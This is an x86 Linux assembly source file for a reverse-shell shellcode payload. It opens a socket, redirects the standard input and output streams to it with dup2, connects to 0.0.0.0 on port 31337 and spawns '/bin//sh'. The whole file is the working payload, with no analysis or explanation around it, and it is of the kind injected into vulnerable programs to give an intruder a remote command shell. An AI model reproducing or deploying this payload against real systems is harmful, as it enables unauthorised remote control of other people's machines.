global _start
section .text

_start:
    xor ebx, ebx
    mul ebx
    mov eax, 0x66 ;sys_socketcall
    inc ebx      ;sys_socket
    push edx
    push ebx
    push 2
    mov ecx, esp
    int 0x80
    
    pop ecx
    xchg eax, ebx
.loop:
    mov eax, 0x3f ;sys_dup2
    int 0x80
    dec ecx
    jns .loop
    
    mov eax, 0x66
    push dword 0x0
    push word  0x697a
    push word 2
    mov ecx, esp
    push 0x10
    push ecx
    push ebx
    mov ecx, esp
    int 0x80
    
    mov eax, 0xb
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    int 0x80
